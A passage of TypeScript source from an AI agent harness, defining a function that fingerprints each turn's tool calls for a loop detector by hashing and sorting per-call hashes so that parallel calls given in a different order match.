 * Compute the per-turn fingerprint used by the loop detector (PLAN §T5 case 4).
 *
 * Sorting the per-call hashes makes parallel-tool-call ordering deterministic
 * across turns — model may emit [shell_exec(ls), shell_exec(pwd)] one turn and
 * [shell_exec(pwd), shell_exec(ls)] the next; both produce the same fingerprint.
 */
export function computeTurnFingerprint(toolCalls: ToolCall[]): string {
  const perCallHashes = toolCalls.map((tc) => {
    // Use raw arguments string when JSON parse fails — preserves retry detection.
    let parsed: unknown;
    try {
      parsed = JSON.parse(tc.function.arguments);
    } catch {
      parsed = tc.function.arguments;
    }
    return hashToolCall(tc.function.name, parsed);
  });
  perCallHashes.sort();
  return createHash('sha256').update(perCallHashes.join('|')).digest('hex');
}
